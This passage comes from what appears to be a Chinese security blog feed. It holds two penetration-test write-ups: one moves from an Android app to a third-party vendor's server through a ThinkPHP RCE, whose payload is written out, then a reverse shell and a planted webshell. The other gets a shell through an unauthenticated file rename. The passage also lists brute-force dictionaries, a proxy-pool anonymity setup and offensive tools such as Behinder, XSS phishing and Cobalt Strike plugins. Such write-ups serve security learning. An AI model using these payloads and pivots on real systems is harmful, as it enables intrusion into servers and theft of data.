<p>那么只要把我们抓包工具的证书安装为安卓系统级别的根证书就可以。</p>
<p>第一步先导出burp证书，其他抓包工具同理：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8E%E4%B8%80%E4%B8%AAApp%E5%88%B0getshell%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/640-16600070036702.png" alt="图片"></p>
<p>然后将证书文件转换一下格式，这一步可以在kali下执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">opensslx509 -in cacert.der -inform DER -out cacert.pem -outformPEM</span><br></pre></td></tr></table></figure>


<p>之后再提取Hash：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">opensslx509 -inform PEM -subject_hash -incacert.pem</span><br></pre></td></tr></table></figure>





<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8E%E4%B8%80%E4%B8%AAApp%E5%88%B0getshell%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/640-16600070036713.png" alt="图片"></p>
<p>得到Hash值后，将证书文件修改名称为Hash值.0，之后用adb工具push到测试设备，或者文件管理器等其他方式上传到设备的&#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts&#x2F;目录下，最后再给证书文件添加644权限即可：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod644 hash.0</span><br></pre></td></tr></table></figure>





<p>证书安装完成后回到App就可以正常抓到包了，继续进行测试：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8E%E4%B8%80%E4%B8%AAApp%E5%88%B0getshell%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/640-16600070036714.png" alt="图片"></p>
<p>之后注册了一个账号，进入主页面之后，发现程序功能并不多。把每个功能都测试一遍，也没发现什么漏洞。</p>
<p>拿着App的域名进行了一波信息收集工作，也发现没什么其他有价值的资产。</p>
<p>重新捋了一下思路后，发现还没有对apk包做过测试，所以就想着反编译看一下有没有什么东西。</p>
<p>直接把包放到jadx中，没有加壳，随便搜索一下关键字，可以发现代码里面有不少域名，那么就把这些域名收集一下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8E%E4%B8%80%E4%B8%AAApp%E5%88%B0getshell%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/640-16600070036715.png" alt="图片"></p>
<h2 id="Web端测试"><a href="#Web端测试" class="headerlink" title="Web端测试"></a><strong>Web端测试</strong></h2><p>把所有从代码里面找出来的域名挨个访问了一遍，终于看到了一个像样的网站，通过和对比发现是程序对应的Web端：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8E%E4%B8%80%E4%B8%AAApp%E5%88%B0getshell%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/640-16600070036716.png" alt="图片"></p>
<p>那么之后的测试就转移到Web端。测试了一下，admin路径可以访问到后台，但是没有弱口令，把手里的字典都跑了一遍也没结果，无法突破。</p>
<p>在前台对各个功能点测试完也依旧没发现什么比较有用的漏洞，再次自闭。最后的思路只有在后台页面html里看到的第三方技术支持公司。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8E%E4%B8%80%E4%B8%AAApp%E5%88%B0getshell%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/640-16600070036717.png" alt="图片"></p>
<h2 id="拿下"><a href="#拿下" class="headerlink" title="拿下"></a><strong>拿下</strong></h2><p>之后又把测试目标转移到了第三方技术支持公司，从信息收集开始，先扫描了一波子域名和目录。</p>
<p>经过一番测试发现其中一个子域是用的thinkphp，随便访问一个不存在路径后会返回错误页面，可以看到thinkphp的版本信息，是有rce漏洞的版本：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8E%E4%B8%80%E4%B8%AAApp%E5%88%B0getshell%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/640-16600070036728.png" alt="图片"></p>
<p>当时内心一阵狂喜，皇天不负有心人，终于找到一个利用点了。拿起exp就是一通乱怼，这个子域下也没有部署waf，很顺利的利用了漏洞：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?s=index/\think\Request/input&amp;filter[]=system&amp;data=whoami</span><br></pre></td></tr></table></figure>





<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8E%E4%B8%80%E4%B8%AAApp%E5%88%B0getshell%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/640-16600070036729.png" alt="图片"></p>
<p>本来执行成功之后是一开始想着写个马，但是考虑到这个不是主要目标，所以还是选择先反弹了一个shell，在服务器上翻找了一下各种文件。</p>
<p>运气很好，找到了原目标的源码的备份文件，通过scp下载了一份，然后开始审计。</p>
<p>各种敏感函数先搜索一下，发现了一个很简单的任意文件读取漏洞：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8E%E4%B8%80%E4%B8%AAApp%E5%88%B0getshell%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/640-166000700367210.png" alt="图片"></p>
<p>file_get_contents函数的参数可以控制，并且没有任何过滤，但是因为目的是要拿下权限，所以用处不大，暂且忽略。</p>
<p>继续搜索到exec时发现有一处命令执行漏洞，代码如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8E%E4%B8%80%E4%B8%AAApp%E5%88%B0getshell%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/640-166000700367211.png" alt="图片"></p>
<p>整体代码逻辑是先判断请求参数action，action值为onetoone_info就走入这个代码段，然后查询用户id和房间号。</p>
<p>这里需要自己登录一个账号，还需要通过遍历找到一个符合条件的房间号，否则无法往下走，之后绕过两个if，走到else的代码段，可以看到有个exec函数，函数的参数$cmd里有个$content是可控的：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8E%E4%B8%80%E4%B8%AAApp%E5%88%B0getshell%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/640-166000700367212.png" alt="图片"></p>
<p>用dnslog平台测试一下执行效果，确认可以成功执行命令：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BB%8E%E4%B8%80%E4%B8%AAApp%E5%88%B0getshell%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/640-166000700367313.png" alt="图片"></p>
<p>确认可以执行命令之后写了个马到目标，完成测试。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h2><p>虽然客户一开始只提供了一个安卓apk，但通过对apk反编译，找到了目标Web端，又通过Web端后台，发现了第三方技术支持公司。</p>
<p>对第三方技术支持公司进行渗透测试，获得到了原目标Web端源码，最后审计源码发现一处命令执行漏洞，拿下权限，圆满完成测试。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>移动安全</tag>
      </tags>
  </entry>
  <entry>
    <title>文件重命名Getshell</title>
    <url>/posts/7a479159.html</url>
    <content><![CDATA[<blockquote>
<p>编者荐语：这篇文章是一个基础的渗透测试例子，也有渗透测试遇到的突发情况，比如上传文件到OSS，无法getshell。</p>
<p>转载自：<a href="https://www.yuque.com/broken5/blog/yngmee">https://www.yuque.com/broken5/blog/yngmee</a></p>
</blockquote>
<p>打开首页，整个网站看上去就是一套新闻站，本来是不想把时间浪费在这个站上面的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8DGetshell/1609311477510-2e159d9c-d11d-4710-b6e2-2608936e3486.png" alt="img"></p>
<p>测了一下admin目录，需要401认证</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8DGetshell/1609311855160-dfd0845d-1533-421d-96a3-f356ccc74032.png" alt="img"></p>
<p>随便点了点，观察其URL像是Tp3的框架，所以就顺手测了一下Tp3的几个常见注入，结果把网站用的CMS给爆了出来</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8DGetshell/1609311695364-1346b6cb-12ed-48fd-ad43-5b93b0c2118f.png" alt="img"></p>
<p>用Fofa去找案例，目的是获取源码或者测试出通用漏洞</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8DGetshell/1609311792787-6431a161-7019-45ab-b97b-365eaf8924a5.png" alt="img"></p>
<p>到这里整理一下思路，怎么快速的去寻找源码或者测漏洞呢：</p>
<ol>
<li>把这几十个站链接保存，通过目录扫描工具批量扫备份获取源码</li>
<li>通过上传webshell，然后获取源码</li>
<li>通过CMS的通用备份获取源码</li>
<li>进后台，后台有未授权添加用户等</li>
<li>Github根据特征找源码</li>
<li>等等等</li>
</ol>
<p>秉承着上述的思路，测试了一个站点之后找到了一个弱口令</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8DGetshell/1609312023749-87bf2e01-5e0e-4a7e-bf69-5f81956dd0a3.png" alt="img"></p>
<p>在后台中我发现了文件管理功能，这个功能一般都能shell</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8DGetshell/1609312725022-d237d4a7-637b-4aa8-a38e-3e3dd7fb3a86.png" alt="img"></p>
<p>有一个改名的功能并且可以修改后缀名</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8DGetshell/1609312795919-07e772c2-ce50-4627-9393-c51937ac3223.png" alt="img"></p>
<p>抓包看参数，路径与文件名都可以完全被用户控制，只需要找一个上传点随便上传一个文件，然后通过修改文件名getshell</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8DGetshell/1609312860379-53b9d004-6d72-44e2-b9fc-0899b3b3863e.png" alt="img"></p>
<p>仔细观察上面请求包的URL路径会发现，他并不是在<code>/admin/</code>目录下，而是在<code>/Include/</code>目录下，这也就说明了它极有可能是一个<code>未授权文件名修改</code>。删除COOKIE测试之后果然如此</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8DGetshell/1609313155756-56d0cafc-5108-44cd-94cb-4be2f9bbf094.png" alt="img"></p>
<p>在发布文章的地方还有一处未授权上传附件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8DGetshell/1609313229830-4b5dd231-1d0f-4302-b87a-a6f57929e0eb.png" alt="img"></p>
<p>现在未授权上传点与未授权修改文件名都有了，那就直接可以去目标站getshell了</p>
<p>可是哪有一番风顺的渗透测试，目标站点启用了OSS，上传的附件传到了OSS上面，所以这个上传点用不了</p>
<p>继续找了一个别的上传点，都是直接传到OSS上面</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8DGetshell/1609313471136-5be820eb-afad-4fc3-926e-61643b79b094.png" alt="img"></p>
<p>绕了一圈，还是回到起点</p>
<p>之前在Github上找到了这套cms的源码，所以还是从源码入手，寻找有没有上传点是直接上传到服务器，不上传OSS的，打开上传源码<code>EditorAction.class.php</code>这太眼熟了，就是<code>Ueditor</code>上传</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8DGetshell/1609313729006-5d65f1d5-4346-40d2-b2de-c68b283d72cd.png" alt="img"></p>
<p><code>Ueditor</code>中有一个<code>catchimage</code>是从远端服务器抓取图片，然后保存到服务器，这总不会上传到OSS吧，立马构造了一个上传包，果然被保存到了本地</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8DGetshell/1609313933741-58ec74f1-f2d6-4a7e-9307-02cc057d0719.png" alt="img"></p>
<p>然后通过未授权修改任意文件名，将后缀改为php</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8DGetshell/1609314024694-0c7e7806-5f3c-4db1-ab24-a139e8963c68.png" alt="img"></p>
<p>成功getshell</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8DGetshell/1609314085834-ae1f2fc2-a4e5-4ae8-a26d-df4e8ed9267f.png" alt="img"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>密码字典</title>
    <url>/posts/3ac82247.html</url>
    <content><![CDATA[<h2 id="Dictionary-Of-Pentesting"><a href="#Dictionary-Of-Pentesting" class="headerlink" title="Dictionary-Of-Pentesting"></a><strong>Dictionary-Of-Pentesting</strong></h2><p>收集一些常用的字典，用于渗透测试、SRC漏洞挖掘、爆破、Fuzzing等实战中。</p>
<p>收集以实用为原则。目前主要分类有认证类、文件路径类、端口类、域名类、无线类、正则类。</p>
<p>涉及的内容包含设备默认密码、文件路径、通用默认密码、HTTP参数、HTTP请求头、正则、应用服务默认密码、子域名、用户名、系统密码、Wifi密码等。</p>
<p>地址：<a href="https://github.com/insightglacier/Dictionary-Of-Pentesting">https://github.com/insightglacier/Dictionary-Of-Pentesting</a></p>
<h2 id="Web-Fuzzing-Box"><a href="#Web-Fuzzing-Box" class="headerlink" title="Web Fuzzing Box"></a><strong>Web Fuzzing Box</strong></h2><p>Web Fuzzing Box - Web 模糊测试字典与一些Payloads，主要包含：弱口令暴力破解、目录以及文件枚举、Web漏洞</p>
<p>地址:<a href="https://github.com/gh0stkey/Web-Fuzzing-Box">https://github.com/gh0stkey/Web-Fuzzing-Box</a></p>
<h2 id="Pentest-Dic"><a href="#Pentest-Dic" class="headerlink" title="Pentest_Dic"></a><strong>Pentest_Dic</strong></h2><p>收集整理自用的字典</p>
<p>收集整理的端口、子域、账号密码、其他杂七杂八字典</p>
<p>地址：<a href="https://github.com/cwkiller/Pentest_Dic">https://github.com/cwkiller/Pentest_Dic</a></p>
<h2 id="Fuzz-Dict"><a href="#Fuzz-Dict" class="headerlink" title="Fuzz-Dict"></a>Fuzz-Dict</h2><p>一些常见字典</p>
<p>ViewState -&gt; 从github&#x2F;gitee 收集了一些开源Web应用的默认Key</p>
<p>upload -&gt; 文件上传参数集合</p>
<p>地址：<a href="https://github.com/yuanhaiGreg/Fuzz-Dict">https://github.com/yuanhaiGreg/Fuzz-Dict</a></p>
]]></content>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>使用代理池实现浏览器匿名上网</title>
    <url>/posts/a5550cb2.html</url>
    <content><![CDATA[<h1 id="一、安装redis镜像"><a href="#一、安装redis镜像" class="headerlink" title="一、安装redis镜像"></a>一、安装redis镜像</h1><h2 id="1-搜索"><a href="#1-搜索" class="headerlink" title="1. 搜索"></a>1. 搜索</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker search redis</span><br></pre></td></tr></table></figure>

<h2 id="2-拉取"><a href="#2-拉取" class="headerlink" title="2. 拉取"></a>2. 拉取</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull redis</span><br></pre></td></tr></table></figure>

<h2 id="3-启动"><a href="#3-启动" class="headerlink" title="3. 启动"></a>3. 启动</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -itd --name redis-test -p 6379:6379 redis</span><br></pre></td></tr></table></figure>

<h2 id="4-测试"><a href="#4-测试" class="headerlink" title="4. 测试"></a>4. 测试</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it redis-test /bin/bash</span><br></pre></td></tr></table></figure>

<h1 id="二、安装代理池"><a href="#二、安装代理池" class="headerlink" title="二、安装代理池"></a>二、安装代理池</h1><h2 id="1-项目地址"><a href="#1-项目地址" class="headerlink" title="1. 项目地址"></a>1. 项目地址</h2><p><a href="https://github.com/jhao104/proxy_pool">https://github.com/jhao104/proxy_pool</a></p>
<h2 id="1-拉取"><a href="#1-拉取" class="headerlink" title="1. 拉取"></a>1. 拉取</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull jhao104/proxy_pool</span><br></pre></td></tr></table></figure>

<h2 id="2-启动"><a href="#2-启动" class="headerlink" title="2. 启动"></a>2. 启动</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eg:</span><br><span class="line">docker run --env DB_CONN=redis://:password@ip:port/db -p 5010:5010 jhao104/proxy_pool:latest</span><br><span class="line">实例：</span><br><span class="line">docker run --env DB_CONN=redis://:@127.0.0.1:6379/db -p 5010:5010 jhao104/proxy_pool:latest</span><br><span class="line">#默认密码为空，默认端口为6379</span><br></pre></td></tr></table></figure>

<h2 id="3-若拉取镜像无法成功连接redis"><a href="#3-若拉取镜像无法成功连接redis" class="headerlink" title="3. 若拉取镜像无法成功连接redis"></a>3. 若拉取镜像无法成功连接redis</h2><p>使用git下载，然后启动</p>
<p>git clone</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone git@github.com:jhao104/proxy_pool.git</span><br></pre></td></tr></table></figure>

<p>安装依赖</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>

<p>更新配置:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># setting.py 为项目配置文件</span><br><span class="line"></span><br><span class="line"># 配置API服务</span><br><span class="line"></span><br><span class="line">HOST = &quot;0.0.0.0&quot;               # IP</span><br><span class="line">PORT = 5000                    # 监听端口</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 配置数据库</span><br><span class="line"></span><br><span class="line">DB_CONN = &#x27;redis://:pwd@127.0.0.1:8888/0&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 配置 ProxyFetcher</span><br><span class="line"></span><br><span class="line">PROXY_FETCHER = [</span><br><span class="line">    &quot;freeProxy01&quot;,      # 这里是启用的代理抓取方法名，所有fetch方法位于fetcher/proxyFetcher.py</span><br><span class="line">    &quot;freeProxy02&quot;,</span><br><span class="line">    # ....</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>启动项目</p>
<ol>
<li>windows下</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 如果已经具备运行条件, 可用通过proxyPool.py启动。</span><br><span class="line"># 程序分为: schedule 调度程序 和 server Api服务</span><br><span class="line"></span><br><span class="line"># 启动调度程序</span><br><span class="line">python proxyPool.py schedule</span><br><span class="line"></span><br><span class="line"># 启动webApi服务</span><br><span class="line">python proxyPool.py server</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>linux下</li>
</ol>
<p>可直接启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./start.sh</span><br></pre></td></tr></table></figure>

<h1 id="三、设置代理服务器"><a href="#三、设置代理服务器" class="headerlink" title="三、设置代理服务器"></a>三、设置代理服务器</h1><h2 id="1-项目地址-1"><a href="#1-项目地址-1" class="headerlink" title="1. 项目地址"></a>1. 项目地址</h2><p>GUI版：<a href="https://github.com/chroblert/JCRandomProxy">https://github.com/chroblert/JCRandomProxy</a></p>
<p>Java版：<a href="https://github.com/safe6Sec/proxyServer">https://github.com/safe6Sec/proxyServer</a></p>
<p>python版：<a href="https://blog.csdn.net/xsjyahoo/article/details/51568712%EF%BC%88%E9%9C%80%E8%A6%81%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E6%B7%BB%E5%8A%A0%E8%8E%B7%E5%8F%96%E4%BB%A3%E7%90%86%E6%B1%A0%E9%83%A8%E5%88%86%E7%9A%84%E4%BB%A3%E7%A0%81%EF%BC%8C%E6%8E%A8%E8%8D%90%EF%BC%89">https://blog.csdn.net/xsjyahoo/article/details/51568712（需要自己动手添加获取代理池部分的代码，推荐）</a></p>
<h2 id="2-下载启动"><a href="#2-下载启动" class="headerlink" title="2. 下载启动"></a>2. 下载启动</h2><p>省略</p>
<h1 id="四、浏览器设置proxy"><a href="#四、浏览器设置proxy" class="headerlink" title="四、浏览器设置proxy"></a>四、浏览器设置proxy</h1><p>将浏览器的代理设置为上面两个项目之一的代理服务器。</p>
<p>比如我使用的是项目二来自动代理</p>
<p>启动命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar proxyServer.jar 8081</span><br></pre></td></tr></table></figure>

<p>浏览器代理设置为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 8081</span><br></pre></td></tr></table></figure>

<h1 id="五、测试"><a href="#五、测试" class="headerlink" title="五、测试"></a>五、测试</h1><p>开启代理后访问<code>http://httpbin.org/ip</code>,会发现ip已经发生变化。</p>
<h1 id="六、可能出现的错误"><a href="#六、可能出现的错误" class="headerlink" title="六、可能出现的错误"></a>六、可能出现的错误</h1><p>运行代理池，提示无法连接redis数据库</p>
<p>解决方法：</p>
<p>1.查找redis进程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -ef | grep redis</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/image-20210821112211527.png" alt="image-20210821112211527"></p>
<p>2.杀死redis进程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kill -9 73652</span><br></pre></td></tr></table></figure>

<p>3.启动redis-server</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-server</span><br></pre></td></tr></table></figure>

<p>4.测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h 127.0.0.1 -p 6379</span><br><span class="line">或</span><br><span class="line">redis-cli</span><br></pre></td></tr></table></figure>

<p>秒连redis。</p>
<p>此时再运行代理池项目可以成功了。</p>
]]></content>
      <categories>
        <category>隐匿技术</category>
      </categories>
      <tags>
        <tag>流量隐藏技术</tag>
      </tags>
  </entry>
  <entry>
    <title>常用工具</title>
    <url>/posts/7050c2d4.html</url>
    <content><![CDATA[<h2 id="冰蝎3-0-Behinder"><a href="#冰蝎3-0-Behinder" class="headerlink" title="冰蝎3.0  Behinder"></a><strong>冰蝎3.0  Behinder</strong></h2><p><a href="https://github.com/rebeyond/Behinder/releases/tag/Behinder_v3.0_Beta_2">https://github.com/rebeyond/Behinder/releases/tag/Behinder_v3.0_Beta_2</a></p>
<h2 id="Shiro-RememberMe-1-2-4-反序列化漏洞图形化检测工具-Shiro-550"><a href="#Shiro-RememberMe-1-2-4-反序列化漏洞图形化检测工具-Shiro-550" class="headerlink" title="Shiro RememberMe 1.2.4 反序列化漏洞图形化检测工具(Shiro-550)"></a><strong>Shiro RememberMe 1.2.4 反序列化漏洞图形化检测工具(Shiro-550)</strong></h2><p><a href="https://github.com/fupinglee/ShiroScan/releases/tag/v1.1">https://github.com/fupinglee/ShiroScan/releases/tag/v1.1</a></p>
<h2 id="Xss钓鱼，Cna插件配合PHP后端收杆"><a href="#Xss钓鱼，Cna插件配合PHP后端收杆" class="headerlink" title="Xss钓鱼，Cna插件配合PHP后端收杆"></a><strong>Xss钓鱼，Cna插件配合PHP后端收杆</strong></h2><p><a href="https://github.com/timwhitez/XSS-Phishing">https://github.com/timwhitez/XSS-Phishing</a></p>
<h2 id="御剑RDP爆破工具下载"><a href="#御剑RDP爆破工具下载" class="headerlink" title="御剑RDP爆破工具下载"></a><strong>御剑RDP爆破工具下载</strong></h2><p>链接: <a href="https://pan.baidu.com/s/18PEBagy1qBBJZpW_0_6UzQ">https://pan.baidu.com/s/18PEBagy1qBBJZpW_0_6UzQ</a> 提取码: 7kik</p>
<h2 id="GoogleColl"><a href="#GoogleColl" class="headerlink" title="GoogleColl"></a><strong>GoogleColl</strong></h2><p>一款搜索引擎网址采集器，目前支持谷歌，其余搜索引擎可自己写模板拓展。</p>
<p>地址：<a href="https://github.com/coodyer/GoogleColler">https://github.com/coodyer/GoogleColler</a></p>
<h2 id="内网渗透工具"><a href="#内网渗透工具" class="headerlink" title="内网渗透工具"></a><strong>内网渗透工具</strong></h2><p><a href="https://github.com/Al1ex/Pentest-tools">https://github.com/Al1ex/Pentest-tools</a></p>
<h2 id="Cobaltstrike插件"><a href="#Cobaltstrike插件" class="headerlink" title="Cobaltstrike插件"></a><strong>Cobaltstrike插件</strong></h2><p>地址：<a href="https://github.com/Al1ex/CSPlugins">https://github.com/Al1ex/CSPlugins</a></p>
